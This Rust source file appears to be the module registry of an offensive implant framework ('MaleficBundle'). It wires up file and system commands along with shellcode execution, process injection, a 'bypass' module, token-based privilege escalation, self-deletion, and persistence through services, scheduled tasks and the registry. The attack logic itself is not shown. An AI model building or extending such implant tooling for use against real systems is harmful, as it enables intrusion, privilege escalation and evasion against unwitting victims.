#![feature(stmt_expr_attributes)]
#![feature(type_alias_impl_trait)]
#![feature(async_closure)]
pub mod execute;
pub mod fs;
pub mod net;
pub mod prelude;
pub mod sys;

use std::collections::HashMap;

use crate::prelude::*;

#[cfg(not(feature = "disable_register"))]
#[no_mangle]
#[allow(improper_ctypes_definitions)]
pub extern "C" fn register_modules() -> MaleficBundle {
    let mut map: MaleficBundle = HashMap::new();

    #[cfg(debug_assertions)]
    map.insert(
        sys::example::Example::name().to_string(),
        Box::new(sys::example::Example::new()),
    );

    register_module!(map, "pwd", fs::pwd::Pwd);
    register_module!(map, "cd", fs::cd::Cd);
    register_module!(map, "ls", fs::ls::Ls);
    register_module!(map, "rm", fs::rm::Rm);
    register_module!(map, "mv", fs::mv::Mv);
    register_module!(map, "cp", fs::cp::Cp);
    register_module!(map, "mkdir", fs::mkdir::Mkdir);
    register_module!(map, "cat", fs::cat::Cat);
    register_module!(map, "touch", fs::touch::Touch);

    register_module!(map, "upload", net::upload::Upload);
    register_module!(map, "download", net::download::Download);

    register_module!(map, "exec", execute::exec::Exec);
    register_module!(map, "open", execute::open::Open);
    register_module!(
        map,
        "execute_shellcode",
        execute::execute_shellcode::ExecuteShellcode
    );
    register_module!(map, "kill", sys::kill::Kill);
    register_module!(map, "whoami", sys::whoami::Whoami);
    register_module!(map, "env", sys::env::Env);
    register_module!(map, "env", sys::env::Setenv);
    register_module!(map, "env", sys::env::Unsetenv);
    register_module!(map, "ps", sys::ps::Ps);
    register_module!(map, "netstat", sys::netstat::Netstat);
    register_module!(map, "info", sys::info::SysInfo);

    #[cfg(target_family = "unix")]
    {
        register_module!(map, "chmod", fs::chmod::Chmod);
        register_module!(map, "chown", fs::chown::Chown);
    }

    #[cfg(target_os = "windows")]
    {
        register_module!(map, "service", sys::service::ServiceList);
        register_module!(map, "service", sys::service::ServiceStart);
        register_module!(map, "service", sys::service::ServiceStop);
        register_module!(map, "service", sys::service::ServiceDelete);
        register_module!(map, "service", sys::service::ServiceQuery);
        register_module!(map, "service", sys::service::ServiceCreate);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdList);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdQuery);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdCreate);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdDelete);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdStart);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdRun);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdStop);
        register_module!(map, "registry", sys::reg::RegQuery);
        register_module!(map, "registry", sys::reg::RegAdd);
        register_module!(map, "registry", sys::reg::RegDelete);
        register_module!(map, "registry", sys::reg::RegListKey);
        register_module!(map, "registry", sys::reg::RegListValue);
        register_module!(map, "bypass", sys::bypass::Bypass);
        register_module!(map, "self_dele", sys::self_dele::SelfDele);
        register_module!(map, "inject", sys::inject::Inject);
        register_module!(map, "runas", sys::token::RunAs);
        register_module!(map, "privs", sys::token::GetPriv);
        register_module!(map, "getsystem", sys::token::GetSystem);
        register_module!(map, "rev2self", sys::token::Rev2Self);
        register_module!(map, "enum_drivers", fs::driver::EnumDrivers);

        // register_module!(map, "pipe", fs::pipe::PipeClose);
        register_module!(map, "pipe", fs::pipe::PipeRead);
        register_module!(map, "pipe", fs::pipe::PipeUpload);
        register_module!(map, "pipe", fs::pipe::PipeServer);

        register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
        #[cfg(feature = "execute_powershell")]
        register_module!(
            map,
            "execute_powershell",
            execute::execute_powershell::ExecutePowershell
        );

        #[cfg(feature = "execute_assembly")]
        register_module!(
            map,
            "execute_assembly",
            execute::execute_assembly::ExecuteAssembly
        );

        register_module!(map, "dllspawn", execute::dllspawn::ExecuteDllSpawn);
        register_module!(map, "inline_local", execute::inline_local::InlineLocal);
        register_module!(
            map,
            "execute_armory",
            execute::execute_armory::ExecuteArmory
        );
        register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
        register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
        register_module!(map, "execute_local", execute::execute_local::ExecuteLocal);

        #[cfg(feature = "wmi")]
        {
            register_module!(map, "wmi", sys::wmi::WmiQuery);
            register_module!(map, "wmi", sys::wmi::WmiExecuteMethod);
        }
    }
    map
}

// DLL export: C ABI functions for runtime hot-loading.
// Each module mirrors register_modules() with matching cfg gates.
#[cfg(feature = "as_module_dll")]
malefic_module::register_rt_modules!(
    // fs
    #[cfg(feature = "pwd")]
    fs::pwd::Pwd,
    #[cfg(feature = "cd")]
    fs::cd::Cd,
    #[cfg(feature = "ls")]
    fs::ls::Ls,
    #[cfg(feature = "rm")]
    fs::rm::Rm,
    #[cfg(feature = "mv")]
    fs::mv::Mv,
    #[cfg(feature = "cp")]
    fs::cp::Cp,
    #[cfg(feature = "mkdir")]
    fs::mkdir::Mkdir,
    #[cfg(feature = "cat")]
    fs::cat::Cat,
    #[cfg(feature = "touch")]
    fs::touch::Touch,
    // net
    #[cfg(feature = "upload")]
    net::upload::Upload,
    #[cfg(feature = "download")]
    net::download::Download,
    // execute
    #[cfg(feature = "exec")]
    execute::exec::Exec,
    #[cfg(feature = "open")]
    execute::open::Open,
    #[cfg(feature = "execute_shellcode")]
    execute::execute_shellcode::ExecuteShellcode,
    // sys
    #[cfg(feature = "kill")]
    sys::kill::Kill,
    #[cfg(feature = "whoami")]
    sys::whoami::Whoami,
    #[cfg(feature = "env")]
    sys::env::Env,
    #[cfg(feature = "env")]
    sys::env::Setenv,
    #[cfg(feature = "env")]
    sys::env::Unsetenv,
    #[cfg(feature = "ps")]
    sys::ps::Ps,
    #[cfg(feature = "netstat")]
    sys::netstat::Netstat,
    #[cfg(feature = "info")]
    sys::info::SysInfo,
    // unix
    #[cfg(all(target_family = "unix", feature = "chmod"))]
    fs::chmod::Chmod,
    #[cfg(all(target_family = "unix", feature = "chown"))]
    fs::chown::Chown,
    // windows
    #[cfg(all(target_os = "windows", feature = "service"))]
    sys::service::ServiceList,
    #[cfg(all(target_os = "windows", feature = "service"))]
    sys::service::ServiceStart,
    #[cfg(all(target_os = "windows", feature = "service"))]
    sys::service::ServiceStop,
    #[cfg(all(target_os = "windows", feature = "service"))]
    sys::service::ServiceDelete,
    #[cfg(all(target_os = "windows", feature = "service"))]
    sys::service::ServiceQuery,
    #[cfg(all(target_os = "windows", feature = "service"))]
    sys::service::ServiceCreate,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdList,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdQuery,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdCreate,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdDelete,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdStart,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdRun,
    #[cfg(all(target_os = "windows", feature = "taskschd"))]
    sys::taskschd::TaskSchdStop,
    #[cfg(all(target_os = "windows", feature = "registry"))]
    sys::reg::RegQuery,
    #[cfg(all(target_os = "windows", feature = "registry"))]
    sys::reg::RegAdd,
    #[cfg(all(target_os = "windows", feature = "registry"))]
    sys::reg::RegDelete,
    #[cfg(all(target_os = "windows", feature = "registry"))]
    sys::reg::RegListKey,
    #[cfg(all(target_os = "windows", feature = "registry"))]
    sys::reg::RegListValue,
    #[cfg(all(target_os = "windows", feature = "bypass"))]
    sys::bypass::Bypass,
    #[cfg(all(target_os = "windows", feature = "self_dele"))]
    sys::self_dele::SelfDele,
    #[cfg(all(target_os = "windows", feature = "inject"))]
    sys::inject::Inject,
    #[cfg(all(target_os = "windows", feature = "runas"))]
    sys::token::RunAs,
    #[cfg(all(target_os = "windows", feature = "privs"))]
    sys::token::GetPriv,
    #[cfg(all(target_os = "windows", feature = "getsystem"))]
    sys::token::GetSystem,
    #[cfg(all(target_os = "windows", feature = "rev2self"))]
    sys::token::Rev2Self,
    #[cfg(all(target_os = "windows", feature = "enum_drivers"))]
    fs::driver::EnumDrivers,
    #[cfg(all(target_os = "windows", feature = "pipe"))]
    fs::pipe::PipeRead,
    #[cfg(all(target_os = "windows", feature = "pipe"))]
    fs::pipe::PipeUpload,
    #[cfg(all(target_os = "windows", feature = "pipe"))]
    fs::pipe::PipeServer,
    #[cfg(all(target_os = "windows", feature = "execute_bof"))]
    execute::execute_bof::ExecuteBof,
    #[cfg(all(target_os = "windows", feature = "execute_powershell"))]
    execute::execute_powershell::ExecutePowershell,
    #[cfg(all(target_os = "windows", feature = "execute_assembly"))]
    execute::execute_assembly::ExecuteAssembly,
    #[cfg(all(target_os = "windows", feature = "dllspawn"))]
    execute::dllspawn::ExecuteDllSpawn,
    #[cfg(all(target_os = "windows", feature = "inline_local"))]
    execute::inline_local::InlineLocal,
    #[cfg(all(target_os = "windows", feature = "execute_armory"))]
    execute::execute_armory::ExecuteArmory,
    #[cfg(all(target_os = "windows", feature = "execute_exe"))]
    execute::execute_exe::ExecuteExe,
    #[cfg(all(target_os = "windows", feature = "execute_dll"))]
    execute::execute_dll::ExecuteDll,
    #[cfg(all(target_os = "windows", feature = "execute_local"))]
    execute::execute_local::ExecuteLocal,
    #[cfg(all(target_os = "windows", feature = "wmi"))]
    sys::wmi::WmiQuery,
    #[cfg(all(target_os = "windows", feature = "wmi"))]
    sys::wmi::WmiExecuteMethod,
    #[cfg(feature = "thread_spawn_test")]
    sys::thread_spawn_test::ThreadSpawnTest
);
